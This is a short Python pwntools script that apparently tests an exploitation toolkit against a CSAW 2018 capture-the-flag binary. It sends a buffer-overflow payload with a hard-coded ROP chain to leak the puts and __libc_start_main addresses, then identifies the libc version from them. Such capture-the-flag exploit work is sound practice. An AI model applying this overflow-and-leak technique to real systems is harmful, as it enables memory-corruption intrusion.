from pwn import *

import sf

import thenight

import time

import sys

target = process("./chall-test_LocalLibcId-csaw18-getit")
bof_payload = sf.BufferOverflow(arch=64)

bof_payload.set_input_start(0x28)
rop_chain = [4195939, 6295576, 4195440, 4195939, 6295592, 4195440]
bof_payload.add_rop_chain(rop_chain)
payload = bof_payload.generate_payload()
target.sendline(payload)
target.recvline()
leak = target.recvuntil(b"\n").strip(b"\n")
gotAddress0 = u64(leak + b"\x00"*(8-len(leak)))
leak = target.recvuntil(b"\n").strip(b"\n")
gotAddress1 = u64(leak + b"\x00"*(8-len(leak)))
symbol0 = "puts"
symbol1 = "__libc_start_main"
thenight.find_libc_version_automated("puts", gotAddress0, "__libc_start_main", gotAddress1)
